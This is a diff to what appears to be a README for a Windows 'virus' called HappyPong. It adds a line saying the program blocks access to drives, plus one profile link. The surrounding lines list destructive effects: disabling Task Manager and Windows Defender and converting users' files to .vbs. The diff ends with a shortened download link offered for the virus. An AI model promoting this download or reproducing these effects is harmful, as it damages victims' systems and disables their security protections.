@@ -33,6 +33,7 @@ Execute some files in the HappyPong folder
 Then it will disable some programs (Task Manager, Control Panel, Run, Command Prompt - allowing batch files to run,...)
 It also disables features like Aero Peek and most used apps in the Start Menu.
 It also changes all files in the .exe file's location to .vbs (VMware files, VirtualBox files, Scratch files, bat and cmd files, HTML files, image files, system files and more)
+It also disables accessing to drives (including hide drives)
 It also changes AM or PM to "HAPPY"
 It also changes the Taskbar color
 It also disables the Windows Defender (only on supported OSes)
@@ -130,7 +131,8 @@ External links:
 5. https://i.imgur.com/ilGkG6C.jpeg
 6. https://scratch.mit.edu/users/brendancodingxd
 7. https://scratch.mit.edu/users/queennotonline
-8. https://www.youtube.com/watch?v=QPQQVMwOEc0
+8. https://scratch.mit.edu/users/dixiklo
+9. https://www.youtube.com/watch?v=QPQQVMwOEc0
 
 Download links:
 v1.0 (RECOMMENDED - I've updated this virus 696969 times): https://bit.ly/3f3Cpz2
